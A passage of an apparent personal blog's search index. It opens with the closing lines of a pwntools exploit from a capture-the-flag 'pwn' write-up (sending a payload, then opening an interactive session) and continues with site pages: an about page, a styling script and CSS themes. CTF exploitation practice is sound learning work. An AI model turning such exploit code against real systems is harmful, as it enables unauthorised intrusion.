class="hljs-built_in">print</span>(payload)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>收藏</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[(function(window, document) {function change_style(){    var parentElement = document.querySelector("[class='markdown-body']");    var pTags = parentElement.querySelectorAll(":scope>p");    for(var i=0;i<pTags.length;i++){        console.log(pTags[i]);        var child_es=pTags[i].querySelectorAll("img");        console.log(child_es);        if (child_es.length==0){            pTags[i].classList.add('salient');        }    }}change_style();})(window,document)]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>友链</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[.img_box{    /* background-color: #f8f8f8; */    line-height:30px;    text-align:center;    margin-top:15px;    padding-bottom: 15px;        transition: all .15s;    font-size:14px;    border: 1px solid #404040;    box-shadow: 0px 0px 6px 0px #484848 ;}.img_box:hover{    /* font-size: 16px; */    /* color: #777777; */    font-weight: bold;    box-shadow: 0px 0px 7px 3px #484848 ;    border: 1px solid #404040;    border-radius: 15px ;}.img_box img{    object-fit:contain;    max-height:600px;}.img_box a{    color:#aaaaaa;    font-family: "楷书";}.img_box a:hover{    color:#aaaaaa;}.img_box span{    display:inline-block;} ]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>QQ: 2127361651</p><p>记录生活</p>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[.salient{    padding-top:3px;    padding-bottom:3px;    padding-left:2px;}.salient:hover{    background-color:#3a4a5a;    border: 1px solid #454d68;    box-shadow: 0px 0px 10px 3px #454d58;    padding-top:2px;    padding-bottom:2px;}]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[.img_box{    /* background-color: #f8f8f8; */    line-height:30px;    text-align:center;    margin-top:15px;    padding-bottom: 15px;        transition: all .15s;    font-size:14px;    border: 1px solid #b0b0b0;    box-shadow: 0px 0px 6px 0px #b8b8b8 ;}.img_box:hover{    /* font-size: 16px; */    /* color: #777777; */    font-weight: bold;    box-shadow: 0px 0px 7px 3px #b8b8b8 ;    border: 1px solid #b0b0b0;    border-radius: 15px ;}.img_box img{    object-fit:contain;    max-height:500px;}.img_box a{    color:#999999;    font-family: "楷书";}.img_box a:hover{    color:#999999;}.img_box span{    display:inline-block;}]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[.salient{    padding-top:3px;    padding-bottom:3px;    padding-left:2px;}.salient:hover{    background-color:#daeafa;    border: 1px solid #d5ddf8;    box-shadow: 0px 0px 10px 3px #daeafa;    padding-top:2px;    padding-bottom:2px;}]]></content>
    
  </entry>
  
  
  
</search>
